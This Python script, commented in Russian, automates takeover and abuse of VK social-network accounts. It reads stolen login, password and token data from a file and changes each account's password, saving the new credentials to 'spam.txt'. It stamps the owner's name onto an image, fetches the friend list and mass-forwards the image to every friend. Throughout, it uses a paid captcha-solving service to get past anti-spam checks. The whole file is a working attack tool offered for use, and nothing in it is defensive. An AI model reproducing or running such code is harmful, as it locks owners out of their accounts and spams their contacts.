from time import sleep

import requests
from PIL import Image, ImageDraw, ImageFont
from python_rucaptcha import ImageCaptcha


def read_token():
    """
    Чтение файла с данными авторизации token.txt
    :return ['login:password:token']
    """
    with open('token.txt') as file:
        auth_data = file.readline().split(':')

    print('[INFO] Данные из файла token.txt прочитаны.')

    return auth_data


def change_password(auth_data, new_password):
    """
    Смена пароля и сохранение его в файл spam.txt
    :return token
    """
    method = 'https://api.vk.com/method/account.changePassword'
    params = {
        'old_password': auth_data[1],
        'new_password': new_password,
        'access_token': auth_data[2],
        'v': '5.131'
    }
    try:
        resp = requests.get(method, params=params)
        token = resp.json().get('response').get('token')
        resp_json = resp.json()

        print(resp.json())

        # Если смена пароля успешна, то записываем в файл spam.txt
        if resp.status_code == requests.codes.ok and 'response' in resp_json:
            with open('spam.txt', 'w') as file:
                file.write(f'{auth_data[0]}:{new_password}:{token}')
            print('[INFO] Смена пароля выполнена успешно!\n'
                  'Новые данные сохранены в файле spam.txt')
            return token
        elif 'error' in resp_json:
            if resp_json.get('error').get('error_code') == 14:
                print('[INFO] Выполняется решении каптчи.')
                captcha_img = resp_json.get('error').get('captcha_img')
                captcha = captcha_solution(captcha_img)
                resp = requests.get(method, params={**params, **captcha})
                token = resp.json().get('response').get('token')
                return token
        else:
            print('[ERROR] Смена пароля не выполнена.')
            print(resp.json())
    except Exception as err:
        print(f'[ERROR] Произошла ошибка при попытке отправки запроса на смену пароля:\n'
              f'{err}')


def get_user_info(token):
    """
    Получаем информацию о пользователе
    :return ['first_name', 'last_name', 'user_id']
    """
    method = 'https://api.vk.com/method/account.getProfileInfo'
    params = {
        'access_token': token,
        'v': '5.131'
    }

    try:
        resp = requests.get(method, params=params)
        resp_json = resp.json()

        print(resp_json)

        if resp.status_code == requests.codes.ok and 'response' in resp_json:
            user_info = []
            first_name = resp_json.get('response').get('first_name')
            last_name = resp_json.get('response').get('last_name')
            user_id = resp_json.get('response').get('id')
            user_info.append(user_id)
            user_info.append(first_name)
            user_info.append(last_name)
            print(f'[INFO] Данные пользователя: {first_name} {last_name}')
            return user_info

    except Exception as err:
        print(f'[ERROR] Произошла ошибка при получении данных пользователя.\n'
              f'{err}')
        print(resp_json)


def change_img(user_info):
    """
    Подставка имени и фамилии по координатам в изображение
    """
    image = Image.open("image.png")
    font = ImageFont.truetype("font.ttf", 26)
    drawer = ImageDraw.Draw(image)
    drawer.text((695, 427), f"{user_info[1]} {user_info[2]}", font=font, fill='black')
    image.save('new_img.png')
    print('[INFO] Выполнено изменение изображения.\n'
          'Новое изображение сохранено с именем new_img.png')


def upload_stories(token):
    """
    Загрузка изображения в сторис
    :return [story_id, owner_id]
    """

    # Получение адреса для загрузки
    upload_method = 'https://api.vk.com/method/stories.getPhotoUploadServer'
    params = {
        'add_to_news': 1,
        'access_token': token,
        'v': '5.131'
    }
    try:
        print('[INFO] Получение URL для загрузки изображения.')
        # resp = requests.post(url=upload_method, data='new_img.png', params=params)
        resp = requests.get(upload_method, params=params)
        resp_json = resp.json()

        print(resp_json)

        if resp.status_code == requests.codes.ok and 'response' in resp_json:
            # upload_result = resp_json.get('response').get('upload_result')
            # sig = resp_json.get('response').get('_sig')
            upload_url = resp_json.get('response').get('upload_url')
            params = {
                'access_token': token,
                'v': '5.131'
            }
            upload_file = requests.post(upload_url, files={'file': 'new_img.png'}, params=params)
            upload_result = upload_file.json().get('response').get('upload_result')
            sig = upload_file.json().get('response').get('_sig')
        else:
            raise '[ERROR] Произошла ошибка при получении URL для загрузки изображения.'

        # Сохранение сторис
        print('[INFO] Сохранение сторис.')
        save_method = 'https://api.vk.com/method/stories.save'
        params = {
            'upload_results': f'{upload_result},{sig}',
            'access_token': token,
            'v': '5.131'
        }

        resp = requests.get(save_method, params=params)
        resp_json = resp.json()

        print(resp_json)

        if resp.status_code == requests.codes.ok and 'response' in resp_json:
            print('[INFO] Сторис успешно опубликована.')
            story_id = resp_json.get('response').get('items')[0].get('id')
            owner_id = resp_json.get('response').get('items')[0].get('owner_id')
            return list(story_id + owner_id)

    except Exception as err:
        print('[ERROR] Возникла ошибка при загрузке сторис.\n'
              f'{err}')


def get_friends(token):
    """
    Получаем список друзей
    :return: [id1, id2, id3, ...]
    """

    method = 'https://api.vk.com/method/friends.get'
    params = {
        'access_token': token,
        'v': '5.131'
    }
    try:
        print('[INFO] Получение списка друзей.')
        resp = requests.get(method, params=params)
        resp_json = resp.json()

        print(resp_json)

        if resp.status_code == requests.codes.ok and 'response' in resp_json:
            print('[INFO] Список друзей получен.')
            return resp_json.get('response').get('items')
    except Exception as err:
        print('[ERROR] Возникла ошибка при получение списка друзей.\n'
              f'{err}')


def send_story_msg(friend, story, token):
    """Рассылка сторис"""
    method = 'https://api.vk.com/method/messages.send'
    params = {
        'user_id': int(friend),
        'random_id': 0,
        'attachment': f'story{story[1]}_{story[0]}',
        'access_token': token,
        'v': '5.131'
    }
    try:
        resp = requests.post(url=method, params=params)
        resp_json = resp.json()

        print(resp_json)

        if resp.status_code == requests.codes.ok and 'response' in resp_json:
            print('[INFO] Сообщение отправлено.')
        elif 'error' in resp_json:
            if resp_json.get('error').get('error_code') == 14:
                print('[INFO] Выполняется решении каптчи.')
                captcha_img = resp_json.get('error').get('captcha_img')
                captcha = captcha_solution(captcha_img)
                resp = requests.get(method, params={**params, **captcha})
                if resp.status_code == requests.codes.ok and 'response' in resp.json():
                    print('[INFO] Сообщение отправлено.')
        else:
            print('[ERROR] Смена пароля не выполнена.')
            print(resp.json())
    except Exception as err:
        print('Возникла ошибка при отправке сообщения.\n'
              f'{err}')


def send_me_msg(user_id, token):
    method = 'https://api.vk.com/method/messages.send'
    method_upload_server = 'https://api.vk.com/method/photos.getMessagesUploadServer'
    method_save_photo = 'https://api.vk.com/method/photos.saveMessagesPhoto'

    params_def = {
        'access_token': token,
        'v': '5.131'
    }

    try:
        # получение url для загрузки
        upload = requests.get(method_upload_server, params=params_def).json()
        upload_url = upload.get('response').get('upload_url')

        # Загрузка
        load = requests.post(upload_url, files={
            'photo': ('image.jpg', open('new_img.png', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}).json()
        server = load.get('server')
        photo = load.get('photo')
        hash = load.get('hash')

        params_load = {
            'server': server,
            'photo': photo,
            'hash': hash
        }
        save_photo = requests.get(method_save_photo, params={**params_def, **params_load}).json()
        id_photo = save_photo.get('response')[0].get('id')
        owner_id = save_photo.get('response')[0].get('owner_id')

        params = {
            'user_id': int(user_id),
            'random_id': 0,
            'attachment': f'photo{owner_id}_{id_photo}',
            'access_token': token,
            'v': '5.131'
        }

        # Отправка сообщения себе
        resp = requests.post(url=method, params=params).json()
        id_msg = resp.get('response')

        if 'response' in resp:
            print('[INFO] Сообщение отправлено.')
            return id_msg
        elif 'error' in resp:
            if resp.get('error').get('error_code') == 14:
                print('[INFO] Выполняется решении каптчи.')
                captcha_img = resp.get('error').get('captcha_img')
                captcha = captcha_solution(captcha_img)
                resp = requests.get(method, params={**params, **captcha})
                if resp.status_code == requests.codes.ok and 'response' in resp.json():
                    print('[INFO] Сообщение отправлено.')
                    return id_msg
        else:
            print('[ERROR] Сообщение не отправлено.')
            print(resp.json())
    except Exception as err:
        print('Возникла ошибка при отправке сообщения.\n'
              f'{err}')


def send_msg(friend, msg, token):
    """Рассылка сообщений"""
    method = 'https://api.vk.com/method/messages.send'
    params_def = {
        'user_id': friend,
        'random_id': 0,
        'message': '.',
        'forward_messages': msg,
        'access_token': token,
        'v': '5.131'
    }
    try:
        print('[INFO] Выполняется рассылка сообщений.')
        resp = requests.get(method, params=params_def).json()
        print(resp)

        if 'response' in resp:
            print('[INFO] Сообщение отправлено.')
        elif 'error' in resp:
            if resp.get('error').get('error_code') == 14:
                print('[INFO] Выполняется решении каптчи.')
                captcha_sid = resp.get('error').get('captcha_sid')
                captcha_img = resp.get('error').get('captcha_img')
                captcha_key = captcha_solution(captcha_img)
                captcha_send = {'captcha_sid': captcha_sid, 'captcha_key': captcha_key}
                resp = requests.get(method, params={**params_def, **captcha_send})
                if resp.status_code == requests.codes.ok and 'response' in resp.json():
                    print('[INFO] Сообщение отправлено.')
        else:
            print('[ERROR] Сообщение не отправлено.')
            print(resp.json())
    except Exception as err:
        print('Возникла ошибка при отправке сообщения.\n'
              f'{err}')


def captcha_solution(captcha_img):
    """
    Решение капчи
    :return: captcha_key
    """
    break_count = 3
    while break_count > 0:
        with open('captcha.txt') as file:
            rucaptcha_key = file.readline()
        # Ссылка на изображения для расшифровки
        image_link = captcha_img
        # Возвращается JSON содержащий информацию для решения капчи
        user_answer = ImageCaptcha.ImageCaptcha(rucaptcha_key=rucaptcha_key).captcha_handler(captcha_link=image_link)

        if not user_answer['error']:
            # решение капчи
            print('[INFO] Капча решена.')
            # captcha_resp = {'captcha_sid': user_answer['taskId'], 'captcha_key': user_answer['captchaSolve']}
            return user_answer['captchaSolve']
        elif user_answer['error']:
            break_count -= 1
            print('[ERROR] Ошибка при решении капчи. Повтор.')
            print(user_answer['errorBody'])


def main():
    new_password = input('Введите новый пароль: ')
    wait = int(input('Введите задержку при отправке сообщения в секундах: '))
    auth_data = read_token()
    sleep(3)
    token = change_password(auth_data, new_password)
    sleep(3)
    user_info = get_user_info(token)
    sleep(3)
    change_img(user_info)
    sleep(3)
    # story_info = upload_stories(token)
    sleep(3)
    friends = get_friends(token)
    sleep(3)
    id_msg = send_me_msg(user_id=user_info[0], token=token)

    count = 0
    for friend in friends:
        send_msg(friend, id_msg, token)
        count += 1
        print(f'[INFO] Сообщение {count} из {len(friends)}.\n'
              f'Пауза на {wait} секунд.')
        sleep(wait)


if __name__ == '__main__':
    main()
